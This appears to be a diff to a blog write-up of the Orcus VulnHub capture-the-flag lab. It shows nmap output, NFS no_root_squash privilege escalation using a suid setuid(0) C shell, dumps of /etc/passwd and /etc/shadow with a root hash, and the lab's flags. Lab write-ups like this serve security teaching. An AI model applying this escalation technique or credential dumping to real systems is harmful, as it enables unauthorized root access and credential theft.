@@ -25,6 +25,64 @@ IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 10.37.129.9     00:1c:42:1e:25:17      1      60  Parallels, Inc.
 {% endhighlight %}
 
+### nmap
+
+nmap -T4 -sV -v 10.37.129.9 -oA orcus
+
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-10 21:30 MDT
+NSE: Loaded 41 scripts for scanning.
+Initiating Ping Scan at 21:30
+Scanning 10.37.129.9 [2 ports]
+Completed Ping Scan at 21:30, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 21:30
+Stats: 0:00:11 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
+Parallel DNS resolution of 1 host. Timing: About 0.00% done
+Completed Parallel DNS resolution of 1 host. at 21:31, 13.00s elapsed
+Initiating Connect Scan at 21:31
+Scanning 10.37.129.9 [1000 ports]
+Discovered open port 995/tcp on 10.37.129.9
+Discovered open port 143/tcp on 10.37.129.9
+Discovered open port 443/tcp on 10.37.129.9
+Discovered open port 53/tcp on 10.37.129.9
+Discovered open port 139/tcp on 10.37.129.9
+Discovered open port 445/tcp on 10.37.129.9
+Discovered open port 110/tcp on 10.37.129.9
+Discovered open port 22/tcp on 10.37.129.9
+Discovered open port 993/tcp on 10.37.129.9
+Discovered open port 111/tcp on 10.37.129.9
+Discovered open port 80/tcp on 10.37.129.9
+Discovered open port 2049/tcp on 10.37.129.9
+Completed Connect Scan at 21:31, 0.08s elapsed (1000 total ports)
+Initiating Service scan at 21:31
+Scanning 12 services on 10.37.129.9
+Completed Service scan at 21:31, 11.02s elapsed (12 services on 1 host)
+NSE: Script scanning 10.37.129.9.
+Initiating NSE at 21:31
+Completed NSE at 21:31, 0.04s elapsed
+Initiating NSE at 21:31
+Completed NSE at 21:31, 0.00s elapsed
+Nmap scan report for 10.37.129.9
+Host is up (0.0048s latency).
+Not shown: 988 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+53/tcp   open  domain      ISC BIND 9.10.3-P4-Ubuntu
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+110/tcp  open  pop3        Dovecot pop3d
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp  open  imap        Dovecot imapd
+443/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+993/tcp  open  ssl/imap    Dovecot imapd
+995/tcp  open  ssl/pop3    Dovecot pop3d
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+Service Info: Host: ORCUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.49 seconds
+
 ### nikto
 
 {% highlight bash %}
@@ -652,9 +710,435 @@ www-data@Orcus:/var/www$
 cd /
 locate flag.txt
 cat /var/www/flag.txt
+868c889965b7ada547fae81f922e45c4
 {% endhighlight %}
 
 There's the first flag
 
 ## PrivEsc
 
+### Enumeration and Analysis
+
+Using g0mi1k's privilege escalation writeup and running various commands I was able to find nfs running as root.  After some researching on interacting with this on the cli I found this command: showmount
+
+{% highlight bash %}
+showmount -e 10.37.129.9
+Export list for 10.37.129.9:
+/tmp *
+{% endhighlight %}
+
+This lists out all the exports mount points from nfs.  The exported mount point is: /tmp so lets mount it!
+
+{% highlight bash %}
+
+mkdir /tmp/vulnhub
+cd /tmp/vulnhub
+ls -lath
+total 48K
+drwxrwxrwt 12 root root 4.0K Aug 24 22:36 .
+drwx------  2 root root 4.0K Aug 24 20:57 tracker-extract-files.0
+drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .ICE-unix
+drwx------  2 root root 4.0K Aug 24 20:57 ssh-TVL1oS3wkLKA
+drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .X11-unix
+drwx------  3 root root 4.0K Aug 24 20:57 systemd-private-3286c9b159bb4c5998249430cd42edb1-colord.service-2d3vOv
+drwx------  3 root root 4.0K Aug 24 20:57 systemd-private-3286c9b159bb4c5998249430cd42edb1-rtkit-daemon.service-YYM1kZ
+drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .font-unix
+drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .Test-unix
+drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .XIM-unix
+drwxrwxrwt  9 root root 4.0K Aug  9 14:45 vulnhub
+drwxr-xr-x 23 root root 4.0K Aug  7 20:26 ..
+
+touch shell.c
+{% endhighlight %}
+
+Then on our web shell:
+
+{% highlight bash %}
+
+ls -lath /tmp
+total 48K
+drwxrwxrwt  9 root root 4.0K Aug  9 16:45 .
+-rw-r--r--  1 root root  139 Aug  9 15:56 shell.c
+drwx------  3 root root 4.0K Aug  7 22:21 systemd-private-765d21d4df6547a5844544a1a0c980b4-dovecot.service-eftoMO
+drwx------  3 root root 4.0K Aug  7 22:21 systemd-private-765d21d4df6547a5844544a1a0c980b4-systemd-timesyncd.service-uFCgDz
+drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .ICE-unix
+drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .Test-unix
+drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .X11-unix
+drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .XIM-unix
+drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .font-unix
+drwxr-xr-x 24 root root 4.0K Oct 30  2016 ..
+
+cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/tmp *(rw,no_root_squash)
+
+{% endhighlight %}
+
+After some research the important part: (rw, no_root_squash) essentially tells the nfs daemon to create files as the user running the service and leave them as is.  When this setting is not present (default in most cases) nfsnobody is the user who owns files created via nfs this is to prevent programs like the one found below from being uploaded and used to escalate privilege.  This means chown chmod are open game
+
+### Exploit
+
+Once I found that nfs was running as root I started looking up how to exploit it and an example for this VM, credits to g0blin research (https://g0blin.co.uk/orcus-vulnhub-writeup/#elevation) was available to learn from:
+
+{% highlight c %}
+#include <unistd.h>
+
+main(int argc, char ** argv, char ** envp)
+{
+    setgid(0);
+    setuid(0);
+    system("/bin/bash", argv, envp);
+    return 0;
+}
+{% endhighlight %}
+
+Then on through our web shell:
+
+{% highlight bash %}
+cd /tmp
+gcc shell.c -o shell
+shell.c:3:1: warning: return type defaults to 'int' [-Wimplicit-int]
+ main( int argc, char ** argv, char ** envp )
+ ^
+shell.c: In function 'main':
+shell.c:7:2: warning: implicit declaration of function 'system' [-Wimplicit-function-declaration]
+ system("/bin/bash", argv, envp);
+ ^
+{% endhighlight %}
+
+Then set the executable up on our host:
+
+{% highlight bash %}
+chown root:root shell
+chmod +s shell
+{% endhighlight %}
+
+Then run the exploit:
+
+{% highlight bash %}
+./shell
+whoami
+root
+{% endhighlight %}
+
+And for the root flag:
+
+{% highlight bash %}
+cd /
+locate flag.txt
+cat /root/flag.txt
+807307b49314f822985d0410de7d8bfe
+{% endhighlight %}
+
+
+## Flag 3
+
+Now that I had root (and it's flag) time to start looking around more...
+
+{% highlight bash %}
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+syslog:x:101:104::/home/syslog:/bin/false
+mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:103:107::/var/run/dbus:/bin/false
+bind:x:104:114::/var/cache/bind:/bin/false
+postfix:x:105:115::/var/spool/postfix:/bin/false
+dovecot:x:106:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:107:118:Dovecot login user,,,:/nonexistent:/bin/false
+landscape:x:108:119::/var/lib/landscape:/bin/false
+sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
+postgres:x:110:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+avahi:x:111:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+colord:x:112:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+kippo:x:1001:27::/home/kippo:/bin/bash
+statd:x:113:65534::/var/lib/nfs:/bin/false
+systemd-timesync:x:114:125:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:115:126:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:116:127:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:117:128:systemd Bus Proxy,,,:/run/systemd:/bin/false
+uuidd:x:100:101::/run/uuidd:/bin/false
+lxd:x:118:65534::/var/lib/lxd/:/bin/false
+_apt:x:119:65534::/nonexistent:/bin/false
+dnsmasq:x:120:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+
+cat /etc/shadow
+root:$6$psudnBp7$lVI5Y6RtuMfKSpyeno0Kw0fJWv9oylnnc7GVeqTanD88zXT5NvjveIyi.rCef4FDXlpbuDMBvFUhraOTAhw3e.:17097:0:99999:7:::
+daemon:*:16273:0:99999:7:::
+bin:*:16273:0:99999:7:::
+sys:*:16273:0:99999:7:::
+sync:*:16273:0:99999:7:::
+games:*:16273:0:99999:7:::
+man:*:16273:0:99999:7:::
+lp:*:16273:0:99999:7:::
+mail:*:16273:0:99999:7:::
+news:*:16273:0:99999:7:::
+uucp:*:16273:0:99999:7:::
+proxy:*:16273:0:99999:7:::
+www-data:*:16273:0:99999:7:::
+backup:*:16273:0:99999:7:::
+list:*:16273:0:99999:7:::
+irc:*:16273:0:99999:7:::
+gnats:*:16273:0:99999:7:::
+nobody:*:16273:0:99999:7:::
+syslog:*:16273:0:99999:7:::
+mysql:!:17083:0:99999:7:::
+messagebus:*:17083:0:99999:7:::
+bind:*:17083:0:99999:7:::
+postfix:*:17083:0:99999:7:::
+dovecot:*:17083:0:99999:7:::
+dovenull:*:17083:0:99999:7:::
+landscape:*:17083:0:99999:7:::
+sshd:*:17083:0:99999:7:::
+postgres:*:17083:0:99999:7:::
+avahi:*:17083:0:99999:7:::
+colord:*:17083:0:99999:7:::
+kippo:!:17086:0:99999:7:::
+statd:*:17088:0:99999:7:::
+systemd-timesync:*:17102:0:99999:7:::
+systemd-network:*:17102:0:99999:7:::
+systemd-resolve:*:17102:0:99999:7:::
+systemd-bus-proxy:*:17102:0:99999:7:::
+uuidd:!:16273:0:99999:7:::
+lxd:*:17102:0:99999:7:::
+_apt:*:17102:0:99999:7:::
+dnsmasq:*:17102:0:99999:7:::
+{% endhighlight %}
+
+Upon initial inspection of these files I didn't see anything that jumped out at me.  Then after a lot more enumeration I broke down and wanted to see how a more experienced tester was able to progress farther.  The user kippo is one that a known honeypot might run as.  Upon running:
+
+{% highlight bash %}
+whereis kippo
+/etc/kippo
+cd /etc/kippo
+ls
+README.md
+data
+dl
+doc
+fs.pickle
+honeyfs
+kippo
+kippo.cfg
+kippo.tac
+log
+start.sh
+stop.sh
+txtcmds
+utils
+
+
+grep -ir 'ssw'  *
+README.md:* Possibility of adding fake file contents so the attacker can 'cat' files such as /etc/passwd. Only minimal file contents are included
+data/userdb.txt:fakuser:1:TH!SP4SSW0RDIS4Fl4G!
+doc/sql/mysql.sql:  `password` varchar(100) NOT NULL,
+fs.pickle:S'update-passwd'
+fs.pickle:S'chgpasswd'
+fs.pickle:S'chpasswd'
+fs.pickle:S'gpasswd'
+fs.pickle:S'passwd'
+fs.pickle:S'grub-mkpasswd-pbkdf2'
+fs.pickle:S'nsswitch.conf'
+fs.pickle:S'base-passwd'
+fs.pickle:S'passwd'
+fs.pickle:S'passwd.expire.cron'
+fs.pickle:S'passwd.1.gz'
+fs.pickle:S'gpasswd.1.gz'
+fs.pickle:S'chpasswd.8.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'update-passwd.8.gz'
+fs.pickle:S'passwd.1.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'passwd.1.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'grub-mkpasswd-pbkdf2.1.gz'
+fs.pickle:S'passwd.1.gz'
+fs.pickle:S'gpasswd.1.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'passwd.1.gz'
+fs.pickle:S'gpasswd.1.gz'
+fs.pickle:S'chpasswd.8.gz'
+fs.pickle:S'update-passwd.8.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'passwd.1.gz'
+fs.pickle:S'gpasswd.1.gz'
+fs.pickle:S'chpasswd.8.gz'
+fs.pickle:S'update-passwd.8.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'update-passwd.8.gz'
+fs.pickle:S'passwd.1.gz'
+fs.pickle:S'gpasswd.1.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'chpasswd.8.gz'
+fs.pickle:S'chgpasswd.8.gz'
+fs.pickle:S'update-passwd.8.gz'
+fs.pickle:S'gpasswd.1.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'passwd2des.3.gz'
+fs.pickle:S'chpasswd.8.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'gpasswd.1.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'passwd.1.gz'
+fs.pickle:S'gpasswd.1.gz'
+fs.pickle:S'chpasswd.8.gz'
+fs.pickle:S'update-passwd.8.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'passwd.1.gz'
+fs.pickle:S'gpasswd.1.gz'
+fs.pickle:S'chpasswd.8.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'nsswitch.conf.5.gz'
+fs.pickle:S'passwd.1.gz'
+fs.pickle:S'gpasswd.1.gz'
+fs.pickle:S'chpasswd.8.gz'
+fs.pickle:S'update-passwd.8.gz'
+fs.pickle:S'passwd.5.gz'
+fs.pickle:S'common-password'
+fs.pickle:S'common-password.md5sums'
+fs.pickle:S'base-passwd'
+fs.pickle:S'passwd.master'
+fs.pickle:S'passwd'
+fs.pickle:S'nsswitch.conf'
+fs.pickle:S'Password.pm'
+fs.pickle:S'Password.pm'
+fs.pickle:S'Password.pm'
+fs.pickle:S'Password.pm'
+fs.pickle:S'Password.pm'
+fs.pickle:S'Password.pm'
+fs.pickle:S'Password.pm'
+fs.pickle:S'yppasswd.x'
+fs.pickle:S'yppasswd.h'
+fs.pickle:S'password.mod'
+fs.pickle:S'password_pbkdf2.mod'
+fs.pickle:S'password'
+fs.pickle:S'passwd.conffiles'
+fs.pickle:S'passwd.md5sums'
+fs.pickle:S'passwd.preinst'
+fs.pickle:S'base-passwd.list'
+fs.pickle:S'base-passwd.md5sums'
+fs.pickle:S'base-passwd.postinst'
+fs.pickle:S'passwd.postinst'
+fs.pickle:S'passwd.list'
+fs.pickle:S'passwords.dat'
+fs.pickle:S'passwd'
+fs.pickle:S'passwd'
+fs.pickle:S'common-password'
+fs.pickle:S'chpasswd'
+fs.pickle:S'nsswitch.conf'
+fs.pickle:S'passwd'
+fs.pickle:S'opasswd'
+fs.pickle:S'passwd-'
+fs.pickle:S'password.mod'
+fs.pickle:S'password_pbkdf2.mod'
+kippo/commands/adduser.py:            (O_P, 'Password: '),
+kippo/commands/adduser.py:            (O_P, 'Password again: '),
+kippo/commands/adduser.py:            self.honeypot.password_input = True
+kippo/commands/adduser.py:        self.honeypot.password_input = False
+kippo/commands/base.py:class command_passwd(HoneyPotCommand):
+kippo/commands/base.py:        self.write('Enter new UNIX password: ')
+kippo/commands/base.py:        self.honeypot.password_input = True
+kippo/commands/base.py:        self.passwd = None
+kippo/commands/base.py:        self.passwd = line
+kippo/commands/base.py:        self.write('Retype new UNIX password: ')
+kippo/commands/base.py:        self.honeypot.password_input = False
+kippo/commands/base.py:        if line != self.passwd or self.passwd == '*':
+kippo/commands/base.py:            self.writeln('Sorry, passwords do not match')
+kippo/commands/base.py:            self.honeypot.user.uid, self.passwd)
+kippo/commands/base.py:        self.writeln('passwd: password updated successfully')
+kippo/commands/base.py:        print 'INPUT (passwd):', line
+kippo/commands/base.py:        self.password = line.strip()
+kippo/commands/base.py:commands['/usr/bin/passwd'] = command_passwd
+kippo/commands/ssh.py:        self.write('%s@%s\'s password: ' % (self.user, self.host))
+kippo/commands/ssh.py:        self.honeypot.password_input = True
+kippo/commands/ssh.py:        self.honeypot.password_input = False
+kippo/dblog/textlog.py:            (args['username'], args['password']))
+kippo/dblog/textlog.py:            (args['username'], args['password']))
+kippo/dblog/mysql.py:            passwd = cfg.get('database_mysql', 'password'),
+kippo/dblog/mysql.py:            ', `username`, `password`, `timestamp`)' + \
+kippo/dblog/mysql.py:            (session, 0, args['username'], args['password'], self.nowUnix()))
+kippo/dblog/mysql.py:            ', `username`, `password`, `timestamp`)' + \
+kippo/dblog/mysql.py:            (session, 1, args['username'], args['password'], self.nowUnix()))
+kippo/dblog/xmpp.py:        password    = cfg.get('database_xmpp', 'password')
+kippo/dblog/xmpp.py:        self.run(application, jid, password, muc, channels)
+kippo/dblog/xmpp.py:    def run(self, application, jidstr, password, muc, channels, anon=True):
+kippo/dblog/xmpp.py:        self.xmppclient = XMPPClient(jid.internJID(jidstr), password)
+kippo/dblog/xmpp.py:        ses['password'] = args['password']
+kippo/dblog/xmpp.py:        ses['password'] = args['password']
+kippo/core/auth.py:            (login, uid_str, passwd) = line.split(':', 2)
+kippo/core/auth.py:            self.userdb.append((login, uid, passwd))
+kippo/core/auth.py:        for (login, uid, passwd) in self.userdb:
+kippo/core/auth.py:            f.write('%s:%d:%s\n' % (login, uid, passwd))
+kippo/core/auth.py:    def checklogin(self, thelogin, thepasswd):
+kippo/core/auth.py:        '''check entered username/password against database'''
+kippo/core/auth.py:        '''note that it allows multiple passwords for a single username'''
+kippo/core/auth.py:        for (login, uid, passwd) in self.userdb:
+kippo/core/auth.py:            if login == thelogin and passwd in (thepasswd, '*'):
+kippo/core/auth.py:        for (login, uid, passwd) in self.userdb:
+kippo/core/auth.py:    def user_password_exists(self, thelogin, thepasswd):
+kippo/core/auth.py:        for (login, uid, passwd) in self.userdb:
+kippo/core/auth.py:            if login == thelogin and passwd == thepasswd:
+kippo/core/auth.py:        for (login, uid, passwd) in self.userdb:
+kippo/core/auth.py:        for (login, uid, passwd) in self.userdb:
+kippo/core/auth.py:    def adduser(self, login, uid, passwd):
+kippo/core/auth.py:        if self.user_password_exists(login, passwd):
+kippo/core/auth.py:        self.userdb.append((login, uid, passwd))
+kippo/core/auth.py:class HoneypotPasswordChecker:
+kippo/core/auth.py:    credentialInterfaces = (credentials.IUsernamePassword,
+kippo/core/auth.py:        if hasattr(credentials, 'password'):
+kippo/core/auth.py:            if self.checkUserPass(credentials.username, credentials.password):
+kippo/core/auth.py:        r = pamConversion((('Password:', 1),))
+kippo/core/auth.py:    def checkUserPass(self, username, password):
+kippo/core/auth.py:        if UserDB().checklogin(username, password):
+kippo/core/auth.py:            print 'login attempt [%s/%s] succeeded' % (username, password)
+kippo/core/auth.py:            print 'login attempt [%s/%s] failed' % (username, password)
+kippo/core/dblog.py:            ('^login attempt \[(?P<username>.*)/(?P<password>.*)\] failed',
+kippo/core/dblog.py:            ('^login attempt \[(?P<username>.*)/(?P<password>.*)\] succeeded',
+kippo/core/dblog.py:    # args has: username, password
+kippo/core/dblog.py:    # args has: username, password
+kippo/core/protocol.py:        self.password_input = False
+kippo/core/protocol.py:    # Easier way to implement password input?
+kippo/core/protocol.py:        if not self.password_input:
+Binary file kippo/core/auth.pyc matches
+kippo.cfg:# user:1:TH!SP4SSW0RDIS4Fl4G!
+kippo.cfg:# Directory for miscellaneous data files, such as the password database.
+kippo.cfg:#password = secret
+kippo.cfg:#password = anonymous
+kippo.tac:factory.portal.registerChecker(core.auth.HoneypotPasswordChecker())
+txtcmds/usr/sbin/vipw:vipw: /etc/passwd is unchanged
+utils/passdb.py:        print 'Usage: %s <pass.db> <add|remove|list> [password]' % \
+utils/passdb.py:        for password in db.keys():
+utils/passdb.py:            print password
+{% endhighlight %}
+
+The second line returned: data/userdb.txt:fakuser:1:TH!SP4SSW0RDIS4Fl4G!
+
+## Flag 4
+
+I wasn't able to find the post-exploitation flag, looks like most didn't, moving on to another.
